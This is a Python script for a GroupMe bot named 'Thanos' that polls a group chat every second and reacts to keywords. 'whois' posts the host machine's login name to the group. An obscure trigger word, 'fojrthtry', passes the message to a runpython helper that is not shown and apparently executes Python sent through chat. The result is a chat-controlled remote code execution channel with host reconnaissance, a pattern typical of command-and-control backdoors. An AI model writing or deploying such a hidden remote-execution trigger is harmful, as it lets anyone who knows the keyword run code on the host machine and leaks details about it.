import fileManage
import botfunctions

import requests
import string
import time
import os
import subprocess
import time

botName = "Thanos"


#GETS THE SENSITVE BOT INFO
def botinfo():
    global botID
    global uID

    f = open("pass.txt", "r")
    lines = [line.rstrip('\n') for line in f]
    botID = lines[0]
    uID = lines[1]


#SENDS A MESSAGE TO THE GROUP
def send(msg, botID):
    post_params = {'bot_id': botID, 'text': msg}
    requests.post('https://api.groupme.com/v3/bots/post', params=post_params)
    return;


#CHECKS ALL THE MESSAGES FOR KEYWORDS
def parse_messages(valid_messages):
    for message in valid_messages:
        print(message['text'])

        if('echo' in message['text'] ):
            botfunctions.echo(message, botID)

        if('whois' in message['text'] ):
            send(os.getlogin(), botID)

        # resume normal actions
        if (message['text'] == 'resume'  ):
            print('resume')

        if ('fojrthtry' in message['text']):
            botfunctions.runpython(message, botID)

        # regular stop
        if (message['text'] == 'Exit' or message['text'] == exit):
            print('ended')
            exit()


#main
if __name__ == '__main__':

    botinfo() #fetch sensitive bot info
    request_params = {'token': uID}

    #if there is no recorded last run of time make the current time the last time read
    if(not os.path.exists("time.txt")):
        fileManage.writeFile('time.txt', str(int(time.time())))

    while True:
        response = requests.get('https://api.groupme.com/v3/groups/47728196/messages', params=request_params)

        #Get the messages
        if (response.status_code == 200):
            response_messages = response.json()['response']['messages']

            #get the last time messages were read and write the current time as the last time messages were read
            last_time = int(fileManage.readFile("time.txt"))
            valid_messages = []
            most_recent_message_time = 0

            # Iterate through each message, checking that it is a message that is not read before and not sent by the bot
            for message in response_messages:
                if( int(message['created_at']) > last_time and message['name'] != botName):
                    valid_messages.append(message)

                    if(most_recent_message_time < int(message['created_at'])):
                        most_recent_message_time = int(message['created_at'])


            if(most_recent_message_time != 0):
                fileManage.writeFile('time.txt', str(most_recent_message_time))

            parse_messages(valid_messages)

        time.sleep(1)
